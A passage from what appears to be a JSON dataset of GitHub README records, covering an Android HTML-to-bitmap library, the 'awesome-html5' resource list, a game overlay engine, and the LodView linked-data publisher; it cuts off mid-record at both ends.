(https:\/\/github.com\/yahoo\/anthelion\/blob\/master\/anthelion\/README.md). \n\nAnthelion\n---------\nFor more details about the Anthelion project please check the Anthelion [README file] (https:\/\/github.com\/yahoo\/anthelion\/blob\/master\/anthelion\/README.md).\n\nReferences\n----------\n[1]. Meusel, Robert, Peter Mika, and Roi Blanco. \"Focused Crawling for Structured Data.\" Proceedings of the 23rd ACM International Conference on Conference on Information and Knowledge Management. ACM, 2014.\n\n[2]. Hellmann, Sebastian, et al. \"Knowledge Base Creation, Enrichment and Repair.\" Linked Open Data--Creating Knowledge Out of Interlinked Data. Springer International Publishing, 2014. 45-69.\n\t\n\n\n###Troubleshooting\n(TODO)\n"},{"repo":"\/iZettle\/android-html2bitmap","language":"Java","readme_contents":"# Generate a bitmap from html on Android\n\nGenerates a bitmap of a defined width from html by rendering the content inside an off screen webview. \n\nDoes not block main thread.\n\nUses the webView available on the system so it's possibilities and limitations will be mirrored by the library.\n\nHeight will be calculated using WebView.getContentHeight()\n\n### Usage: \n```\ndependencies {\n    implementation 'com.izettle:html2bitmap:1.9'\n}\n```\n\n```\nBitmap bitmap = new Html2Bitmap.Builder(context: Context, content: WebViewContent).build().getBitmap();\n```\n\n- **context** Used to create webview - application context is fine.\n- **html** The html that should be rendered to a bitmap.\n- **width** The requested width of the generated bitmap.\n- **timeout** Seconds before the job will terminate - if timeout is reached will call stopLoading() on the webview and return null.\n\nCalls are blocking and hence recommended to be moved into a background thread.\n\n##### Under the hood\nWill wait for remote and local resources to load before generating bitmap i.e. \"http:\/\/www.sample.com\/image.jpg\"\nwill be downloaded before the screenshot is taken - _take this into account before defining a timeout for the whole process._\n\nCan be used anywhere you have access to a context. The purpose of the library was to perform its \njob inside a background thread and not to be tied to an activity.\n\nCalls are synchronous to simplify usage in a background thread.\n```\nnew AsyncTask<Void, Void, Bitmap>() {\n    @Override\n    protected Bitmap doInBackground(Void... voids) {\n        String html = \"<html><body><p>Hello world!<\/p><br\/>Html bitmap<\/body><html>\";\n        \n        return new Html2Bitmap.Builder().setContext(context).setContent(WebViewContent.html(html)).build().getBitmap();   \n    }\n\n    @Override\n    protected void onPostExecute(Bitmap bitmap) {\n        if (bitmap != null) {\n            imageView.setImageBitmap(bitmap);\n        }\n    }\n}.execute();\n```\n\nNote: Some of the methods on the webview are required to be run on the mainThread \nof the application - so some operations will be performed on that thread.\n\n\n![screenshot_1523608598](https:\/\/user-images.githubusercontent.com\/373219\/38725783-b3a9f364-3f08-11e8-8820-c8ecc7abe7ae.png)\n"},{"repo":"\/awei922\/html","language":"CSS","readme_contents":"## \u4e2a\u4eba\u7f51\u7ad9   \r\n[http:\/\/mjiong.com](http:\/\/mjiong.com) \u7f51\u7ad9\u57df\u540d\u7531aweig.com\u8f6c\u4e3amjiong.com\r\n\r\n---\r\n1\u3001wanliYear-[2017\u5e74\u6625\u8fd0\u62a2\u7968\u65f6\u95f4](https:\/\/awei922.github.io\/html\/wanliYear\/index.html)   \r\n2\u3001NEC-[NEC : \u66f4\u597d\u7684CSS\u6837\u5f0f\u89e3\u51b3\u65b9\u6848\uff08\u7f51\u6613\uff09](http:\/\/nec.netease.com\/) \u3010GitHub:<https:\/\/github.com\/awei922\/html\/tree\/master\/NEC>\u3011  \r\n3\u3001homePage-[\u4e2a\u4eba\u4e3b\u9875demo](https:\/\/awei922.github.io\/html\/homePage\/index.html)       \r\n4\u3001cropperjs-demo-[h5\u5229\u7528cropper.js\u5b9e\u73b0\u56fe\u7247\u88c1\u526ademo](https:\/\/awei922.github.io\/html\/cropperjs-demo\/index.html)            \r\n5\u3001swiper-demo-[\u5229\u7528swiper\u52a8\u6001\u521b\u5efa\u56fe\u7247\u9884\u89c8\u6548\u679c\uff08\u517c\u5bb9\u79fb\u52a8\u7aef\uff09](https:\/\/awei922.github.io\/html\/swiper-demo\/index.html)     \r\n6\u3001audioplayerJs-[webapp\u97f3\u9891\u64ad\u653e\u63d2\u4ef6audioplay.js](https:\/\/awei922.github.io\/html\/audioplayerJs\/index.html)    \r\n7\u3001marquee-js-[js\u5b9e\u73b0marquee\u6587\u5b57\u65e0\u9650\u6eda\u52a8](https:\/\/awei922.github.io\/html\/marquee-js\/index.html)        \r\n8\u3001cross-domain-js\u8de8\u57df\u51e0\u79cd\u89e3\u51b3\u65b9\u6848   \r\n"},{"repo":"\/diegocard\/awesome-html5","language":null,"readme_contents":"Awesome HTML5 [![Awesome](https:\/\/cdn.rawgit.com\/sindresorhus\/awesome\/d7305f38d29fed78fa85652e3a63e154dd8e8829\/media\/badge.svg)](https:\/\/github.com\/sindresorhus\/awesome) [![Build Status](https:\/\/api.travis-ci.org\/diegocard\/awesome-html5.svg?branch=master)](https:\/\/travis-ci.org\/diegocard\/awesome-html5)\n=============\n\nA curated list of awesome HTML5 resources. Inspired by [awesome-php](https:\/\/github.com\/ziadoz\/awesome-php) and [awesome-python](https:\/\/github.com\/vinta\/awesome-python)\n\n## Table of Contents\n- [Articles and standards](#articles-and-standards)\n- [Multimedia capabilities](#multimedia-capabilities)\n  - [Audio](#audio)\n  - [Media capture](#media-capture)\n  - [Picture in Picture](#picture-in-picture)\n  - [Speech synthesis](#speech-synthesis)\n  - [Voice recognition](#voice-recognition)\n  - [Virtual Reality (VR)](#virtual-reality)\n  - [Web animations](#web-animations)\n- [Elements](#elements)\n  - [Canvas](#canvas)\n  - [Head](#head)\n  - [Sectioning](#sectioning)\n  - [Media Elements](#media-elements)\n  - [Forms](#forms)\n  - [Time](#time)\n  - [WebVTT](#webtt)\n  - [HTML Imports](#html-imports)\n- [Development APIs](#development-apis)\n  - [Permissions](#permissions)\n  - [Geolocation](#geolocation)\n  - [Cryptography](#cryptography)\n  - [File](#file)\n  - [Frame timing](#frame-timing)\n  - [requestIdleCallback](#requestidlecallback)\n  - [requestAnimationFrame](#requestanimationframe)\n  - [Web payments](#web-payments)\n- [Semantics](#semantics)\n- [Accessibility](#accessibility)\n- [DOM management](#dom-management)\n  - [Shadow DOM](#shadow-dom)\n  - [Data Binding](#data-binding)\n  - [Web Components](#web-components)\n- [Progressive web apps](#progressive-web-apps)\n  - [Service Workers](#service-workers)\n  - [Offline caching](#offline-caching)\n  - [Push Notifications](#push-notifications)\n- [Client side storage](#client-side-storage)\n- [Performance](#performance)\n- [Mobile](#mobile)\n- [Communications and interoperability](#communications-and-interoperability)\n  - [Web Sockets](#web-sockets)\n  - [WebRTC](#webrtc)\n- [Web Workers](#web-workers)\n- [WebGL](#webgl)\n- [Browser compatibility](#browser-compatibility)\n- [Books](#books)\n- [Game development](#game-development)\n- [Videos and Keynotes](#videos-and-keynotes)\n- [Websites and resources](#websites-and-resources)\n  - [Websites](#websites)\n  - [Weekly news](#weekly-news)\n  - [Twitter](#twitter)\n- [Contributing](#contributing)\n\n## Articles and standards\n\n* [HTML 5.3](https:\/\/w3c.github.io\/html\/) - Current HTML5 spec\n* [Progressive enhancement](https:\/\/www.smashingmagazine.com\/2009\/04\/progressive-enhancement-what-it-is-and-how-to-use-it\/)\n* [The extensible web manifesto](https:\/\/extensiblewebmanifesto.org\/)\n* [Differences between HTML5 and HTML4 from W3C](https:\/\/www.w3.org\/TR\/html5-diff\/)\n\n## Multimedia capabilities\n\n### Audio\n\n* [Getting started with the Web Audio API](https:\/\/www.html5rocks.com\/en\/tutorials\/webaudio\/intro\/?redirect_from_locale=es)\n* [Web Audio API at MDN](https:\/\/developer.mozilla.org\/es\/docs\/Web_Audio_API)\n* [Making a Guitar Tuner with HTML5](https:\/\/jonathan.bergknoff.com\/journal\/making-a-guitar-tuner-html5)\n* [Audio visualisation with the Web Audio API and React](https:\/\/www.twilio.com\/blog\/audio-visualisation-web-audio-api--react)\n\n### Media Capture\n\n* [Capturing Audio & Video in HTML5](https:\/\/www.html5rocks.com\/es\/tutorials\/getusermedia\/intro\/)\n* [Using the media capture API](https:\/\/www.sitepoint.com\/using-the-media-capture-api\/)\n\n### Picture in Picture\n\n* [Chrome's new Picture in Picture API](https:\/\/developers.google.com\/web\/updates\/2018\/10\/watch-video-using-picture-in-picture)\n\n### Speech Synthesis\n\n* [Intro to the HTML5 Speech Synthesis API](http:\/\/creative-punch.net\/2014\/10\/intro-html5-speech-synthesis-api\/)\n* [Another useful intro](https:\/\/shapeshed.com\/html5-speech-recognition-api\/)\n\n### Voice Recognition\n\n* [Web speech API demo](https:\/\/www.google.com\/intl\/en\/chrome\/demos\/speech.html)\n* [Using the Web Speech API](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/Web_Speech_API\/Using_the_Web_Speech_API)\n* [Experimenting with the Web Speech API](https:\/\/www.sitepoint.com\/experimenting-web-speech-api\/)\n* [Free voice recognition library (annyang)](https:\/\/www.talater.com\/annyang\/)\n\n### Virtual Reality\n\n* [Firefox Reality now available](https:\/\/blog.mozilla.org\/blog\/2018\/09\/18\/firefox-reality-now-available\/)\n\n### Web animations\n\n* [Intro to web animations](http:\/\/danielcwilson.com\/blog\/2015\/07\/animations-intro\/)\n* [When to Use the Web Animations API](http:\/\/danielcwilson.com\/blog\/2016\/08\/why-waapi\/)\n\n## Elements\n\n### Canvas\n\n* [Brief description from W3 Schools](https:\/\/www.w3schools.com\/tags\/tag_canvas.asp)\n* [Tutorial from MDN](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/Canvas_API\/Tutorial)\n* [Various Tutorials](https:\/\/www.html5canvastutorials.com\/)\n* [Cheat Sheet](https:\/\/simon.html5.org\/dump\/html5-canvas-cheat-sheet.html)\n\n### Head\n\n* [A list of things that go in your pages' HEAD element](https:\/\/gethead.info\/)\n\n### Sectioning\n\n* [How to Use The HTML5 Sectioning Elements](https:\/\/blog.teamtreehouse.com\/use-html5-sectioning-elements)\n\n### Media Elements\n\n* Audio and Video\n  - [audio tag from W3Schools](https:\/\/www.w3schools.com\/tags\/tag_audio.asp)\n  - [video tag from W3 Schools](https:\/\/www.w3schools.com\/tags\/tag_video.asp)\n  - [Tutorial from MDN](https:\/\/developer.mozilla.org\/en-US\/docs\/Learn\/HTML\/Multimedia_and_embedding\/Video_and_audio_content)\n  - [Capturing audio and video in HTML5](https:\/\/www.html5rocks.com\/en\/tutorials\/getusermedia\/intro\/)\n* embed tag\n  - [Brief description from W3 Schools](https:\/\/www.w3schools.com\/tags\/tag_embed.asp)\n* source tag\n  - [Brief description from W3 Schools](https:\/\/www.w3schools.com\/tags\/tag_source.asp)\n* track tag\n  - [Brief description from W3 Schools](https:\/\/www.w3schools.com\/tags\/tag_track.asp)\n\n### Forms\n\n* [Changes to forms in HTML5 from MDN](https:\/\/developer.mozilla.org\/en-US\/docs\/Learn\/HTML\/Forms)\n\n### Details\n\n* [How to Use the Details and Summary Elements](https:\/\/blog.teamtreehouse.com\/use-details-summary-elements)\n* [Details element polyfill](https:\/\/www.smashingmagazine.com\/2014\/11\/complete-polyfill-html5-details-element\/)\n\n### Time\n\n* [Time element guide](https:\/\/www.sitepoint.com\/html5-time-element-guide\/)\n\n### WebVTT\n\n* [First draft from W3C](http:\/\/www.w3.org\/TR\/2014\/WD-webvtt1-20141113\/)\n\n### HTML Imports\n\n* [Introduction to HTML imports](https:\/\/www.webcomponents.org\/community\/articles\/introduction-to-html-imports)\n\n## Development APIs\n\n### Permissions\n\n* [Permissions API for the Web by Google](https:\/\/developers.google.com\/web\/updates\/2015\/04\/permissions-api-for-the-web)\n\n### Geolocation\n\n* [Using Geolocation](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/Geolocation_API)\n* [HTML5 Apps: Positioning with Geolocation](https:\/\/code.tutsplus.com\/tutorials\/html5-apps-positioning-with-geolocation--mobile-456)\n\n### Cryptography\n\n* [Web Cryptography API draft](http:\/\/www.w3.org\/TR\/WebCryptoAPI\/)\n* [Table of web cryptography support](http:\/\/diafygi.github.io\/webcrypto-examples\/)\n* [Window.crypto](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/Window\/crypto)\n* [Cryptography next steps from W3C](http:\/\/www.w3.org\/2012\/webcrypto\/webcrypto-next-workshop\/report.html)\n\n### File\n\n* [Using files from web applications (MDN)](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/File\/Using_files_from_web_applications)\n* [Reading local files in JavaScript](https:\/\/www.html5rocks.com\/en\/tutorials\/file\/dndfiles\/)\n* [File API Draft](https:\/\/w3c.github.io\/FileAPI\/)\n* [File system API](http:\/\/www.w3.org\/TR\/file-system-api\/)\n\n### Frame timing\n\n* [Video from google developers](https:\/\/www.youtube.com\/watch?v=4zoC3eaa9z0)\n* [Draft from W3C](https:\/\/w3c.github.io\/frame-timing\/)\n\n### requestIdleCallback\n\n* [On Google developers](https:\/\/developers.google.com\/web\/updates\/2015\/08\/using-requestidlecallback)\n\n### requestAnimationFrame\n\n* [Using requestAnimationFrame (CSS Tricks)](https:\/\/css-tricks.com\/using-requestanimationframe\/)\n* [Great article by Paul Irish](https:\/\/medium.com\/@paul_irish\/requestanimationframe-scheduling-for-nerds-9c57f7438ef4#.9gev5fdub)\n\n### Web payments\n\n* [Web payments API overview](https:\/\/developers.google.com\/web\/fundamentals\/payments\/)\n\n## Semantics\n\n* [Semantic elements from W3Schools](https:\/\/www.w3schools.com\/html\/html5_semantic_elements.asp)\n* [Sections and Outlines of an HTML5 from MDN Document](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/Guide\/HTML\/Using_HTML_sections_and_outlines)\n* [HTML5 Semantics from Smashing Magazine](https:\/\/www.smashingmagazine.com\/2011\/11\/html5-semantics\/)\n* [Lesser known semantics element from W3C & Opera](https:\/\/developer.mozilla.org\/en-US\/docs\/Learn\/HTML\/Introduction_to_HTML\/Advanced_text_formatting)\n\n## Accessibility\n\n* [Excellent intro to accessibility from Google's fundamentals](https:\/\/developers.google.com\/web\/fundamentals\/accessibility\/)\n* [Accessibility checklist for web developers](https:\/\/webaim.org\/standards\/wcag\/checklist)\n* [ARIA from MDN](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/Accessibility\/ARIA)\n* [Great Accessibility Style Guide](https:\/\/a11y-style-guide.com\/style-guide\/)\n* [Designing for Cognitive Differences](https:\/\/alistapart.com\/article\/designing-for-cognitive-differences)\n* [Guide on how HTML elements are supported by screen readers](https:\/\/thepaciellogroup.github.io\/AT-browser-tests\/)\n* [Top 25 Accessibility Testing Tools for Website](https:\/\/dynomapper.com\/blog\/27-accessibility-testing\/246-top-25-awesome-accessibility-testing-tools-for-websites)\n* [Web Accessibility Evaluation Tools List from W3](http:\/\/www.w3.org\/WAI\/ER\/tools\/)\n* [Pa11y - automated accessibility testing](http:\/\/pa11y.org\/)\n* [Aria in HTML](https:\/\/developer.paciellogroup.com\/blog\/2014\/10\/aria-in-html-there-goes-the-neighborhood\/)\n* [Accessible and Responsive HTML5 Video Player](https:\/\/2017.ind.ie\/blog\/accessible-video-player\/)\n\n## DOM Management\n\n### Shadow DOM\n\n* [Shadow DOM v1: self-contained web components](https:\/\/developers.google.com\/web\/fundamentals\/web-components\/shadowdom)\n* [What's New in Shadow DOM v1 (by examples)](https:\/\/hayato.io\/2016\/shadowdomv1\/)\n\n### Data Binding\n\n* [Data-binding Revolutions with Object.observe()](https:\/\/www.html5rocks.com\/en\/tutorials\/es7\/observe\/)\n\n### Web Components\n\n* [Custom elements v1: reusable web components](https:\/\/developers.google.com\/web\/fundamentals\/web-components\/customelements)\n* [The power of web components](https:\/\/hacks.mozilla.org\/2018\/11\/the-power-of-web-components\/)\n* [Polymer project](https:\/\/github.com\/polymer)\n* [A Quick Introduction To Polymer](https:\/\/www.webcomponents.org\/community\/articles\/a-quick-polymer-introduction)\n* [Building web components using Polymer and ES6 classes](https:\/\/www.polymer-project.org\/blog\/es6)\n* [Demythstifying Web Components](http:\/\/www.backalleycoder.com\/2016\/08\/26\/demythstifying-web-components\/)\n* [HTML imports](https:\/\/www.html5rocks.com\/en\/tutorials\/webcomponents\/imports\/)\n* [Building Webapps with Yeoman and Polymer](https:\/\/www.html5rocks.com\/en\/tutorials\/webcomponents\/yeoman\/)\n\n## Progressive web apps\n\n* [Intro to PWAs](https:\/\/developers.google.com\/web\/progressive-web-apps\/)\n* [An Extensive Guide To Progressive Web Applications](https:\/\/www.smashingmagazine.com\/2018\/11\/guide-pwa-progressive-web-applications\/)\n* [The Business Case for Progressive Web Apps](https:\/\/cloudfour.com\/thinks\/the-business-case-for-progressive-web-apps\/)\n\n### Service Workers\n\n* [Service Worker fundamentals](https:\/\/developers.google.com\/web\/fundamentals\/primers\/service-workers\/)\n* [ServiceWorkies - Learn SWs playing a game](https:\/\/serviceworkies.com\/)\n* [The Service Worker Cookbook](https:\/\/serviceworke.rs\/)\n* [Offline content with service workers](https:\/\/www.madebymike.com.au\/writing\/service-workers\/)\n* [Making a Service Worker: a case study (Smashing Magazine)](https:\/\/www.smashingmagazine.com\/2016\/02\/making-a-service-worker\/)\n* [Service workers explained](https:\/\/github.com\/w3c\/ServiceWorker\/blob\/master\/explainer.md)\n* [Service Worker Libraries, Totally Tooling Tips](https:\/\/www.youtube.com\/watch?v=IIRj8DftkqE)\n* [ServiceWorker: Revolution of the Web Platform](https:\/\/ponyfoo.com\/articles\/serviceworker-revolution)\n\n### Offline caching\n\n* [The Offline Cookbook](https:\/\/developers.google.com\/web\/fundamentals\/instant-and-offline\/offline-cookbook\/)\n* [Instant-loading Offline-first (Progressive Web App Summit 2016)](https:\/\/www.youtube.com\/watch?v=qDJAz3IIq18)\n* [Offline Storage for Progressive Web Apps (article by Addy Osmani)](https:\/\/medium.com\/dev-channel\/offline-storage-for-progressive-web-apps-70d52695513c#.jsbxgywzz)\n* [A Beginner's Guide to Using the Application Cache](https:\/\/www.html5rocks.com\/en\/tutorials\/appcache\/beginner\/)\n\n### Push Notifications\n\n* [Web Push Notifications (Google's Web fundamentals)](https:\/\/developers.google.com\/web\/fundamentals\/push-notifications\/)\n* [Push API W3C draft](http:\/\/w3c.github.io\/push-api\/)\n* [Notifications API spec](https:\/\/notifications.spec.whatwg.org\/)\n\n## Client side storage\n\n* [Client-Side Storage](https:\/\/www.html5rocks.com\/en\/tutorials\/offline\/storage\/)\n* [Offline Cookbook](https:\/\/jakearchibald.com\/2014\/offline-cookbook\/)\n* [Introduction to IndexedDB](https:\/\/www.codemag.com\/Article\/1411041)\n* [Real-World Off-Line Data Storage](https:\/\/code.tutsplus.com\/tutorials\/real-world-off-line-data-storage--net-34063)\n* [Local storage tutorial](https:\/\/developer.mozilla.org\/en-US\/docs\/Archive\/Add-ons\/Overlay_Extensions\/XUL_School\/Local_Storage)\n\n## Performance\n\n* [Accelerated Mobile Pages (AMP)](https:\/\/www.ampproject.org\/learn\/overview\/)\n* [Google developers best practices](https:\/\/developers.google.com\/speed\/docs\/insights\/rules)\n* [Optimizing performance from Google Web Fundamentals](https:\/\/developers.google.com\/web\/fundamentals\/performance\/why-performance-matters\/)\n* [Resource hints draft (preconnect and preload)](http:\/\/www.w3.org\/TR\/2014\/WD-resource-hints-20141021\/)\n* [Prefetching and prerendeding](https:\/\/medium.com\/@luisvieira_gmr\/html5-prefetch-1e54f6dda15d)\n* [Image compression](https:\/\/www.html5rocks.com\/en\/tutorials\/speed\/img-compression\/)\n* [Text compression](https:\/\/www.html5rocks.com\/en\/tutorials\/speed\/txt-compression\/)\n* [Resource timing spec](http:\/\/www.w3.org\/TR\/resource-timing\/)\n\n## Mobile\n\n* [The Web App Manifest (Google's fundamentals)](https:\/\/developers.google.com\/web\/fundamentals\/web-app-manifest\/)\n* [Field guide to web applications](https:\/\/www.html5rocks.com\/webappfieldguide\/toc\/index\/)\n* [Apache Cordova tutorial](http:\/\/ccoenraets.github.io\/cordova-tutorial\/)\n* [PhoneGap from Scratch](https:\/\/code.tutsplus.com\/tutorials\/phonegap-from-scratch-introduction--mobile-9171)\n* [Best practices for mobile web apps](https:\/\/www.html5rocks.com\/en\/tutorials\/speed\/quick\/)\n* [Build mobile apps with Kendo UI]https:\/\/docs.telerik.com\/kendo-ui\/controls\/hybrid\/introduction)\n* [HTML5 Vibration API](https:\/\/code.tutsplus.com\/tutorials\/html5-vibration-api--mobile-22585)\n* [HTML5 Battery Status API](https:\/\/code.tutsplus.com\/tutorials\/html5-battery-status-api--mobile-22795)\n* [Privacy analysis of the HTML5 Battery Status API](https:\/\/eprint.iacr.org\/2015\/616.pdf)\n* [HTML5 Network Information API](https:\/\/code.tutsplus.com\/tutorials\/html5-network-information-api--cms-21598)\n* [Sencha Touch tutorials](https:\/\/docs.sencha.com\/)\n\n## Communications and interoperability\n\n### Web Sockets\n\n* [Introducing Websockets](https:\/\/www.html5rocks.com\/en\/tutorials\/websockets\/basics\/)\n\n### WebRTC\n\n* [What is WebRTC and how does it work](https:\/\/www.innoarchitech.com\/what-is-webrtc-and-how-does-it-work\/)\n* [WebRTC made simple](https:\/\/blog.carbonfive.com\/2014\/10\/16\/webrtc-made-simple\/)\n* [WebRTC data channels tutorial](https:\/\/www.html5rocks.com\/en\/tutorials\/webrtc\/datachannels\/)\n* [WebRTC data channels from MDN](https:\/\/developer.mozilla.org\/en-US\/docs\/Games\/Techniques\/WebRTC_data_channels)\n\n## Web Workers\n\n* [Web Worker Basics](https:\/\/www.html5rocks.com\/en\/tutorials\/workers\/basics\/)\n* [How fast are web workers?](https:\/\/hacks.mozilla.org\/2015\/07\/how-fast-are-web-workers\/)\n* [Web Workers in MDN](https:\/\/developer.mozilla.org\/en-US\/docs\/Web\/API\/Web_Workers_API\/Using_web_workers)\n* [Getting started with Web Workers](https:\/\/code.tutsplus.com\/tutorials\/getting-started-with-web-workers--net-27667)\n\n## WebGL\n\n* [WebGL Fundamentals](https:\/\/www.html5rocks.com\/en\/tutorials\/webgl\/webgl_fundamentals\/)\n\n## Browser compatibility\n\n* [I want to use](http:\/\/www.iwanttouse.com\/)\n* [Can I use...](https:\/\/caniuse.com\/)\n* [W3C quality tools](http:\/\/w3c.github.io\/developers\/tools\/)\n* [HTML5 test](http:\/\/beta.html5test.com\/)\n* [HTML5 demos](https:\/\/bestvpn.org\/html5demos\/)\n\n## Books\n\n* [Dive Into HTML5](http:\/\/diveinto.html5doctor.com\/)\n* [HTML5: Up and Running](https:\/\/www.amazon.com\/HTML5-Running-Dive-Future-Development\/dp\/0596806027)\n* [Using the HTML5 Filesystem API](http:\/\/shop.oreilly.com\/product\/0636920021360.do)\n* [HTML5 Game Development Insights](https:\/\/www.apress.com\/us\/book\/9781430266976)\n* [Web Design Playground: HTML & CSS The Interactive Way](https:\/\/www.manning.com\/books\/web-design-playground)\n\n## Game development\n\n* [Getting started with HTML5 Game Development from Mozilla Hacks](https:\/\/hacks.mozilla.org\/2013\/09\/getting-started-with-html5-game-development\/)\n* [HTML 5 game development video series by Mozilla](https:\/\/hacks.mozilla.org\/2016\/02\/html-5-game-development-video-series\/)\n* [Info, news and tutorials](http:\/\/html5gamedevelopment.com\/)\n* [Over 380 resources on HTML5 game development](https:\/\/html5-game-development.zeef.com\/andre.antonio.schmitz)\n* Opensource JavaScript game engines\n  - [Pixi.js](https:\/\/github.com\/pixijs\/pixi.js)\n  - [phaser](https:\/\/github.com\/photonstorm\/phaser)\n  - [MelonJS](https:\/\/github.com\/melonjs\/melonJS)\n  - [kiwi.js](https:\/\/github.com\/gamelab\/kiwi.js)\n  - [Crafty](https:\/\/github.com\/craftyjs\/Crafty)\n  - [PhysicsJS](https:\/\/github.com\/wellcaffeinated\/PhysicsJS)\n  - [Stage.js](https:\/\/github.com\/shakiba\/stage.js)\n  - [cocos2d](https:\/\/github.com\/cocos2d\/cocos2d-html5)\n\n## Videos and Keynotes\n\n* [HTML5 Developer Conference](https:\/\/html5devconf.com\/videos.html)\n* [Polymer: declarative, encapsulated, reusable components](https:\/\/www.youtube.com\/watch?v=DH1vTVkqCDQ)\n* [Making the mobile web fast, feature-rich, and beautiful](https:\/\/www.youtube.com\/watch?v=EXjPsvwIDwU)\n* [Dart: HTML of the Future, Today!](https:\/\/www.youtube.com\/watch?v=euCNWhs7ivQ)\n\n## Websites and resources\n\n### Websites\n\n* [HTML official reference](https:\/\/webplatform.github.io\/docs\/Main_Page\/index.html) (allows collaborative modification of content like wiki)\n* [HTML5 Rocks](https:\/\/www.html5rocks.com\/en\/) (news, tutorials and updates)\n* [HTML5 Gallery](http:\/\/html5gallery.com\/) (a showcase of sites using HTML5 markup and API's)\n* [HTML5 development guide from MDN](https:\/\/developer.mozilla.org\/en-US\/docs\/Learn\/HTML)\n* [W3C Highlights form June 2014](http:\/\/www.w3.org\/2014\/06\/w3c-highlights\/)\n* [HTML5 Please](https:\/\/html5please.com\/) (Know when HTML5 feature are ready to use)\n* [Keen HTML](https:\/\/keenhtml.com) (Free interactive lessons to learn HTML)\n\n### Weekly news\n\n* [HTML5 Weekly](https:\/\/frontendfoc.us\/)\n* [Mozilla Hacks Weekly Articles](https:\/\/hacks.mozilla.org\/category\/mozilla-hacks-weekly\/)\n* [Responsive Design Newsletter](http:\/\/responsivedesignweekly.com\/)\n\n### Twitter\n\n* [@html5](https:\/\/twitter.com\/html5)\n* [@html5rock](https:\/\/twitter.com\/html5rock)\n* [@html5gallery](https:\/\/twitter.com\/html5gallery)\n* [@html5doctor](https:\/\/twitter.com\/html5doctor)\n* [@GameDevHTML5](https:\/\/twitter.com\/GameDevHTML5)\n* [@mozhacks](https:\/\/twitter.com\/mozhacks)\n* [@googlechrome](https:\/\/twitter.com\/googlechrome)\n\n## Other awesome lists\n\n* [awesome-awesomeness](https:\/\/github.com\/bayandin\/awesome-awesomeness)\n* [lists](https:\/\/github.com\/jnv\/lists)\n* [Community Curated Resources](https:\/\/hackr.io\/tutorials\/learn-html-5)\n\n## Contributing\n\nYour contributions are always welcome!\n"},{"repo":"\/ZCube\/CEFOverlayEngine","language":"C++","readme_contents":"# CEFOverlayEngine\n\n## Interface\nButton or Key | Description\n-------- | ----\nShift + F3 | Show\/Hide\nCtrl + Alt + Shift | Click-through.\n\n## Screenshots (in FullScreen Mode)\nFFXIV (DX11) with ACT SKIN(miniparseGlowIcon)\n![N|Solid](https:\/\/raw.githubusercontent.com\/ZCube\/CEFOverlayEngine\/master\/screenshots\/ffxiv_dx11_with_act_skin.png)\n\nDarkest Dungeon (OpenGL) \n![N|Solid](https:\/\/raw.githubusercontent.com\/ZCube\/CEFOverlayEngine\/master\/screenshots\/darkest_dungeon_opengl32_with_google.jpg)\n\nDarkSouls3 (DX11) \n![N|Solid](https:\/\/raw.githubusercontent.com\/ZCube\/CEFOverlayEngine\/master\/screenshots\/darksouls3_dx11_with_google.jpg)\n\n## Used Libraries\nLibrary | Description\n------- | -----------\n[Boost](https:\/\/boost.org) | Boost Library (ASIO, filesystem)\n[ImGui](https:\/\/github.com\/ocornut\/imgui) | Dear ImGui \n[JsonCPP](https:\/\/github.com\/open-source-parsers\/jsoncpp) | Json Library\n[Reshade](https:\/\/github.com\/crosire\/reshade) | Used as overlay injector\n\nNO WARRANTY. ANY USE OF THE SOFTWARE IS ENTIRELY AT YOUR OWN RISK.\n\n\n## Note ##\n\nThis repository is no longer maintained.\n"},{"repo":"\/LodLive\/LodView","language":"Java","readme_contents":"# LodView\nLodView is a Java web application based on Spring and Jena, it's a tool able to offer a W3C standard compliant IRI dereferenciation. LodView, in conjunction with a SPARQL endpoint, allows you to publish RDF data according to all defined standards for Linked Open Data.\n\nLodView is easy to configure and deploy for any developer and it dramatically improves the end user\u2019s experience in accessing HTML based representations of RDF resources.\n\n## About us\nLodView (as [LodLive](https:\/\/github.com\/dvcama\/LodLive)) is ideated and maintained by Diego Valerio Camarda and Alessandro Antonuccio. [Diego](https:\/\/www.linkedin.com\/in\/dvcama) is the RDF guy behind the technology, and [Alessandro](http:\/\/hstudio.it) is the designer responsible for the interface and the UX.\n\n## Why develop it (for free)\nWe believe that the dereferencing layer has to be independent from the SPARQL endpoint implementation so during these last years we preferred using [Pubby](http:\/\/wifo5-03.informatik.uni-mannheim.de\/pubby\/) to other software for publishing our data. Probably you don't know this, but you already know Pubby, it is used to publish DBpedia data and a lot of other Linked Open Data out there. Sadly, it is pretty old and its development appears to have stopped, so we created LodView taking inspiration from some of the features in it we really appreciated.\n\nLodView shares Pubby philosophy; the configuration approach (an RDF file) and the basic technologies (we also use Apache Jena) are very similar, both interfaces even look somewhat alike, but we have made some important improvements according to the [RDF 1.1 Standard](https:\/\/www.w3.org\/TR\/rdf11-concepts\/). We have added new features and changed the ones we didn't like (such as the 303 redirection for HTML representation).\n\nWhile developing [LodLive](https:\/\/github.com\/dvcama\/LodLive), we realized that there was real need for a great interface to spread linked data principles even more effectively, so we spent time designing an interface for LodView that would be easy to use and beautiful to experience. LodView is free to use for all and we hope that the LOD community may appreciate and enjoy our brand new piece of work.\n\nLodView is an open source software, you may download it and use for it your own data publication but it is also a web service (http:\/\/lodview.it) useful to browse any resource published using a SPARQL endpoint or published according to the rules of the web of data (aka content negotiation and RDF).\n\n## Demo\nYou can find some examples on http:\/\/lodview.it.\n\n## Who is using it\nSee [the list of known users](https:\/\/github.com\/dvcama\/LodView\/wiki\/LodView-users).\n\n## Installation instruction\nSee [the wiki page](https:\/\/github.com\/dvcama\/LodView\/wiki).\n\n## Some interesting features\n##### Content negotiation and serialization\nLodView allows you to publish RDF data offering a lot of different serializations. It handles content negotiation requests with or without 303 redirections: at the same IRI you can fully access different versions of the resource (HTML, turtle, n-triples, json, json-ld, and many more) or you can set a suffix useful to redirect some requests to an HTML representation of the resource (eg. `http:\/\/example.com\/resource\/aaaa\/html`). You can also override content negotiation features adding the 'output' parameter to the URL and specifying which serialization format you want to access, e.g. `http:\/\/example.com?output=application\/ld-json`).\n\nFrom LodView v1.2.0 you can also use prefixes (e.g. 